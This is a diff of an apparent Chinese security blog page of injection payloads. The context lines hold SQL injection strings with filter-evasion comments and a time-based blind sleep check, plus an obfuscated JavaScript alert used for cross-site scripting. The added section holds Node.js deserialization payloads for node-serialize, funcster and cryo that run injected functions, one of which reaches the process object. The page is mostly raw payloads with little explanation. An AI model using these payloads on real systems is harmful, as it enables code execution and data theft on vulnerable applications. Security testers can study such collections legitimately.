@@ -15,7 +15,7 @@ SQL注入 mysql &gt; union union select id from user where id = &#39;1&#39; and 
 
 <meta itemprop="datePublished" content="2019-04-25T21:15:41&#43;08:00" />
 <meta itemprop="dateModified" content="2019-04-25T21:15:41&#43;08:00" />
-<meta itemprop="wordCount" content="84">
+<meta itemprop="wordCount" content="111">
 
   <meta itemprop="image" content="https://picsum.photos/1024/768/?random">
 
@@ -138,6 +138,19 @@ Set.constructor`al\x65rt\x2814\x29```;</code></pre></div>
 </span><span class="c1"></span>
 <span class="n">bool</span> 
 <span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">id</span><span class="o">=</span><span class="s1">&#39;1&#39;</span> <span class="k">and</span> <span class="n">sleep</span><span class="cm">/**/</span><span class="p">((</span><span class="k">select</span> <span class="o">@</span><span class="n">a</span><span class="p">:</span><span class="o">=</span><span class="k">if</span><span class="p">(</span><span class="k">user</span><span class="cm">/**/</span><span class="p">()</span> <span class="n">regexp</span> <span class="cm">/*!&#39;a&#39;*/</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">)))</span></code></pre></div>
+<h2 id="反序列化">反序列化<a href="#反序列化" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+
+<h3 id="nodejs">nodejs<a href="#nodejs" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+
+<pre><code>{&quot;anything_here&quot;:&quot;_$$ND_FUNC$$_function (){сonsole.log(1)}&quot;}
+
+{ __js_function: 'function testa(){var pr = this.constructor.constructor(&quot;return process&quot;)(); pr.stdout.write(&quot;param-pam-pam&quot;) }()' }
+
+{&quot;root&quot;:&quot;_CRYO_REF_1&quot;,&quot;references&quot;:[{&quot;contents&quot;:{},&quot;value&quot;:&quot;_CRYO_FUNCTION_function () {return 1111;}&quot;},{&quot;contents&quot;:{&quot;testFunc&quot;:&quot;_CRYO_REF_0&quot;},&quot;value&quot;:&quot;_CRYO_OBJECT_&quot;}]}
+
+{&quot;root&quot;:&quot;CRYO_REF_3&quot;,&quot;references&quot;:[{&quot;contents&quot;:{},&quot;value&quot;:&quot;_CRYO_FUNCTION_function () {console.log(\&quot;defconrussia\&quot;); return 1111;}&quot;},{&quot;contents&quot;:{},&quot;value&quot;:&quot;_CRYO_FUNCTION_function () {return 2222;}&quot;},{&quot;contents&quot;:{&quot;toString&quot;:&quot;_CRYO_REF_0&quot;,&quot;valueOf&quot;:&quot;_CRYO_REF_1&quot;},&quot;value&quot;:&quot;_CRYO_OBJECT&quot;},{&quot;contents&quot;:{&quot;proto&quot;:&quot;CRYO_REF_2&quot;},&quot;value&quot;:&quot;_CRYO_OBJECT&quot;}]}
+</code></pre>
+
 			</div>
 			<hr class="post-end">
 			<footer class="post-info">
